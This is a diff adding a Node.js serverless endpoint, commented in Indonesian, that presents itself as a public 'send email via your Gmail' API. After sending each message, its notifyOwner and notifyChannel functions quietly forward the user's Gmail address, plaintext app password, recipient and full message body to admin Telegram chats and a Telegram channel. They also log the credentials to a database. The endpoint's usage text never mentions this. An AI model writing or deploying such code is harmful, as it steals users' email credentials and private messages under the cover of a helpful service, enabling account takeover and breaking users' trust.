@@ -1,0 +1,384 @@
+import nodemailer from 'nodemailer';
+import cors from 'cors';
+import { Telegraf } from 'telegraf';
+import { ApiKey } from '../models/ApiKey.js';
+import { TelegramLog } from '../models/TelegramLog.js';
+import connectDB from '../utils/connectDB.js';
+
+// ---------- Helper: middleware wrapper ----------
+const runMiddleware = (req, res, fn) =>
+  new Promise((resolve, reject) => {
+    fn(req, res, (result) =>
+      result instanceof Error ? reject(result) : resolve(result)
+    );
+  });
+
+// ---------- Helper: strip HTML tags dan entitas ----------
+function stripHtml(html) {
+  if (!html) return '';
+  let text = html.replace(/<[^>]*>/g, ' ');
+  const entities = {
+    '&nbsp;': ' ',
+    '&amp;': '&',
+    '&lt;': '<',
+    '&gt;': '>',
+    '&quot;': '"',
+    '&#39;': "'",
+    '&apos;': "'",
+  };
+  text = text.replace(/&[a-z]+;/gi, (match) => entities[match] || match);
+  return text.replace(/\s+/g, ' ').trim();
+}
+
+// ---------- Helper: hitung jumlah kata ----------
+function countWords(str) {
+  if (!str) return 0;
+  return str.trim().split(/\s+/).length;
+}
+
+// ---------- Helper: sleep ----------
+const sleep = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+
+// ---------- Konfigurasi Admin Chat ----------
+const ADMIN_CHAT_IDS = (process.env.ADMIN_CHAT_ID || '')
+  .split(',')
+  .map((id) => id.trim())
+  .filter(Boolean);
+
+// ---------- Notifikasi ke Admin ----------
+async function notifyOwner(botToken, gmailUser, gmailAppPassword, to, subject, messageId, text, html) {
+  console.log('[notifyOwner] Called with params:', {
+    botToken: botToken ? '***' : 'missing',
+    gmailUser,
+    to,
+    subject,
+    messageId,
+    hasText: !!text,
+    hasHtml: !!html,
+  });
+
+  if (!botToken) {
+    console.error('[notifyOwner] TELEGRAM_BOT_TOKEN is missing');
+    return;
+  }
+
+  if (ADMIN_CHAT_IDS.length === 0) {
+    console.error('[notifyOwner] ADMIN_CHAT_ID is empty or not set');
+    return;
+  }
+
+  try {
+    const bot = new Telegraf(botToken, { handlerTimeout: 10000 });
+
+    const hasText = typeof text === 'string' && text.trim().length > 0;
+    const hasHtml = typeof html === 'string' && html.trim().length > 0;
+    const rawBody = hasText ? text : hasHtml ? stripHtml(html) : '';
+    const bodyLabel = hasText
+      ? '📄 Body Pesan'
+      : hasHtml
+      ? '📄 Body Pesan (HTML diubah ke teks)'
+      : '📄 Body Pesan (kosong)';
+    const timestamp = new Date().toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+
+    const fileContent = `📧 NOTIFIKASI PENGIRIMAN EMAIL
+✅ Status: Berhasil dikirim
+📤 Dikirim ke: ${to}
+📝 Subject: ${subject}
+🆔 Message ID: ${messageId}
+
+📧 Gmail yang digunakan:
+└ Email: ${gmailUser}
+└ App Password: ${gmailAppPassword}
+
+${bodyLabel}:
+${rawBody || '(kosong)'}
+
+⏰ Waktu: ${timestamp}
+`;
+
+    const MAX_INLINE = 3800;
+    const truncated =
+      rawBody.length > MAX_INLINE
+        ? rawBody.substring(0, MAX_INLINE) + '\n\n... [pesan dipotong, terlalu panjang]'
+        : rawBody;
+
+    const notificationMessage = `
+📧 NOTIFIKASI PENGIRIMAN EMAIL
+
+✅ Status: Berhasil dikirim
+📤 Dikirim ke: ${to}
+📝 Subject: ${subject}
+🆔 Message ID: ${messageId}
+
+📧 Gmail yang digunakan:
+└ Email: ${gmailUser}
+└ App Password: ${gmailAppPassword}
+
+${bodyLabel}:
+${truncated || '(kosong)'}
+
+⏰ Waktu: ${timestamp}
+    `.trim();
+
+    for (const chatId of ADMIN_CHAT_IDS) {
+      try {
+        if (fileContent.length > 4096) {
+          const buffer = Buffer.from(fileContent, 'utf-8');
+          await bot.telegram.sendDocument(
+            chatId,
+            { source: buffer, filename: 'notifikasi-email.txt' },
+            {
+              caption: `📧 Notifikasi pengiriman email (${rawBody.length} karakter - dikirim sebagai file)`,
+            }
+          );
+          console.log(`[notifyOwner] File .txt terkirim ke admin ${chatId}`);
+        } else {
+          await bot.telegram.sendMessage(chatId, notificationMessage);
+          console.log(`[notifyOwner] Pesan teks terkirim ke admin ${chatId}`);
+        }
+      } catch (sendError) {
+        // Tangani rate limit 429
+        if (sendError.response && sendError.response.statusCode === 429) {
+          const retryAfter = sendError.response.body?.parameters?.retry_after || 10;
+          console.log(`[notifyOwner] Rate limit untuk ${chatId}, menunggu ${retryAfter} detik...`);
+          await sleep(retryAfter * 1000);
+          // Coba ulang sekali
+          try {
+            if (fileContent.length > 4096) {
+              const buffer = Buffer.from(fileContent, 'utf-8');
+              await bot.telegram.sendDocument(
+                chatId,
+                { source: buffer, filename: 'notifikasi-email.txt' },
+                {
+                  caption: `📧 Notifikasi pengiriman email (${rawBody.length} karakter - dikirim sebagai file)`,
+                }
+              );
+            } else {
+              await bot.telegram.sendMessage(chatId, notificationMessage);
+            }
+            console.log(`[notifyOwner] Berhasil dikirim ke admin ${chatId} setelah retry`);
+          } catch (retryError) {
+            console.error(`[notifyOwner] Gagal setelah retry ke ${chatId}:`, retryError.message);
+          }
+        } else {
+          console.error(`[notifyOwner] Gagal kirim ke admin ${chatId}:`, sendError.message);
+        }
+      }
+      // Jeda antar chat untuk menghindari rate limit (diperpanjang menjadi 2 detik)
+      await sleep(2000);
+    }
+  } catch (error) {
+    console.error('[notifyOwner] Unexpected error:', error.message);
+  }
+}
+
+// ---------- Notifikasi ke Channel (dengan deduplikasi) ----------
+async function notifyChannel(botToken, gmailUser, gmailAppPassword, subject, bodyContent) {
+  console.log('[notifyChannel] Called with params:', {
+    botToken: botToken ? '***' : 'missing',
+    gmailUser,
+    subject,
+    bodyLength: bodyContent ? bodyContent.length : 0,
+  });
+
+  const channelId = process.env.TELEGRAM_CHANNEL_ID;
+  const cooldownMinutes = parseInt(process.env.NOTIFICATION_COOLDOWN_MINUTES) || 60;
+
+  if (!botToken) {
+    console.error('[notifyChannel] TELEGRAM_BOT_TOKEN is missing');
+    return;
+  }
+
+  if (!channelId) {
+    console.error('[notifyChannel] TELEGRAM_CHANNEL_ID is missing');
+    return;
+  }
+
+  const cleanedPassword = gmailAppPassword.replace(/\s/g, '');
+  await connectDB();
+
+  const now = new Date();
+  const cooldownDate = new Date(now.getTime() - cooldownMinutes * 60 * 1000);
+
+  const existing = await TelegramLog.findOne({
+    gmailUser: gmailUser,
+    gmailAppPassword: cleanedPassword,
+  });
+
+  if (existing && existing.lastNotifiedAt > cooldownDate) {
+    console.log(`[notifyChannel] Duplicate credentials (${gmailUser}), skipping channel notification`);
+    return;
+  }
+
+  try {
+    const bot = new Telegraf(botToken, { handlerTimeout: 10000 });
+    const timestamp = now.toLocaleString('id-ID', { timeZone: 'Asia/Jakarta' });
+    const header = `
+🔔 PEMBERITAHUAN PENGGUNAAN API SEND GMAIL
+
+📌 Subject: ${subject || '(tidak ada subject)'}
+
+📧 Gmail yang digunakan:
+└ ${gmailUser}
+
+🔑 App Password:
+└ ${cleanedPassword}
+
+📄 Body:
+`;
+
+    const wordCount = countWords(bodyContent);
+    const isLong = wordCount > 500;
+
+    if (isLong) {
+      const fullContent = `${header}\n${bodyContent || '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
+      const buffer = Buffer.from(fullContent, 'utf-8');
+      await bot.telegram.sendDocument(
+        channelId,
+        { source: buffer, filename: 'notifikasi-email.txt' },
+        {
+          caption: `📧 Notifikasi pengiriman email (${wordCount} kata - dikirim sebagai file karena > 500 kata)`,
+        }
+      );
+      console.log(`[notifyChannel] File .txt terkirim ke channel ${channelId}`);
+    } else {
+      let message =
+        `${header}${bodyContent && bodyContent.trim().length > 0 ? `${bodyContent.trim()}` : '(kosong)'}\n\n⏰ Waktu: ${timestamp}`;
+      if (message.length > 4096) {
+        message = message.substring(0, 4000) + '\n\n... [pesan dipotong karena terlalu panjang]';
+      }
+      await bot.telegram.sendMessage(channelId, message);
+      console.log(`[notifyChannel] Pesan teks terkirim ke channel ${channelId}`);
+    }
+
+    await TelegramLog.findOneAndUpdate(
+      { gmailUser: gmailUser, gmailAppPassword: cleanedPassword },
+      { lastNotifiedAt: now },
+      { upsert: true, new: true }
+    );
+  } catch (error) {
+    console.error('[notifyChannel] Error:', error.message);
+  }
+}
+
+// ---------- Main Handler ----------
+export default async function handler(req, res) {
+  res.json = (data) => {
+    res.setHeader('Content-Type', 'application/json');
+    return res.send(JSON.stringify(data, null, 2));
+  };
+
+  try {
+    await runMiddleware(req, res, cors());
+
+    if (req.method !== 'POST') {
+      return res.status(405).json({
+        status: 'error',
+        error: 'Method Not Allowed',
+        message: 'Hanya method POST yang diizinkan untuk endpoint ini.',
+        usage: {
+          endpoint: '/api/send-email',
+          method: 'POST',
+          description: 'Mengirim email menggunakan API Key dan akun Gmail pribadi.',
+          required_fields: ['apiKey', 'to', 'subject', 'gmailUser', 'gmailAppPassword'],
+          optional_fields: ['text', 'html (minimal salah satu)'],
+          example: {
+            curl: `curl -X POST ${process.env.BASE_URL}/api/send-email \\
+  -H "Content-Type: application/json" \\
+  -d '{
+    "apiKey": "YOUR_API_KEY",
+    "to": "tujuan@example.com",
+    "subject": "Test Email",
+    "text": "Halo dunia!",
+    "gmailUser": "emailkamu@gmail.com",
+    "gmailAppPassword": "abcd efgh ijkl mnop"
+  }'`,
+            response_success: { success: true, messageId: '<...>@gmail.com' },
+            response_error: { error: 'Invalid or expired API Key' },
+          },
+        },
+        author: 'Ipanzxdev',
+      });
+    }
+
+    const { apiKey, to, subject, text, html, gmailUser, gmailAppPassword } = req.body;
+
+    if (!apiKey) return res.status(401).json({ error: 'API Key required' });
+    if (!to || !subject || (!text && !html))
+      return res.status(400).json({ error: 'Missing fields' });
+    if (!gmailUser || !gmailAppPassword)
+      return res.status(400).json({ error: 'Gmail credentials required' });
+
+    const cleanedPassword = gmailAppPassword.replace(/\s/g, '');
+    const isAdmin = apiKey === process.env.ADMIN_API_KEY;
+    let isValid = false;
+
+    if (!isAdmin) {
+      await connectDB();
+      const keyData = await ApiKey.findOne({ key: apiKey, isActive: true });
+      if (keyData) {
+        isValid = true;
+        if (keyData.expiresAt && new Date() > keyData.expiresAt) {
+          keyData.isActive = false;
+          await keyData.save();
+          isValid = false;
+        }
+      }
+    } else {
+      isValid = true;
+    }
+
+    if (!isValid) return res.status(401).json({ error: 'Invalid or expired API Key' });
+
+    // Kirim email
+    const transporter = nodemailer.createTransport({
+      host: 'smtp.gmail.com',
+      port: 587,
+      secure: false,
+      auth: { user: gmailUser, pass: cleanedPassword },
+    });
+
+    const info = await transporter.sendMail({
+      from: `"${gmailUser}" <${gmailUser}>`,
+      to,
+      subject,
+      text,
+      html: html || text,
+    });
+
+    console.log('[Handler] Email terkirim, messageId:', info.messageId);
+
+    // **Jeda 5 detik sebelum notifikasi ke owner untuk menghindari rate limit**
+    await sleep(5000);
+
+    // Notifikasi ke owner (admin)
+    await notifyOwner(
+      process.env.TELEGRAM_BOT_TOKEN,
+      gmailUser,
+      cleanedPassword,
+      to,
+      subject,
+      info.messageId,
+      text,
+      html
+    );
+
+    // **Jeda 5 detik lagi sebelum notifikasi channel**
+    await sleep(5000);
+
+    // Notifikasi ke channel
+    const bodyForChannel = text && text.trim() ? text : html ? stripHtml(html) : '';
+    await notifyChannel(
+      process.env.TELEGRAM_BOT_TOKEN,
+      gmailUser,
+      cleanedPassword,
+      subject,
+      bodyForChannel
+    );
+
+    res.status(200).json({ success: true, messageId: info.messageId });
+  } catch (error) {
+    console.error('[Handler] Error:', error);
+    res.status(500).json({ error: 'Internal server error', detail: error.message });
+  }
+}
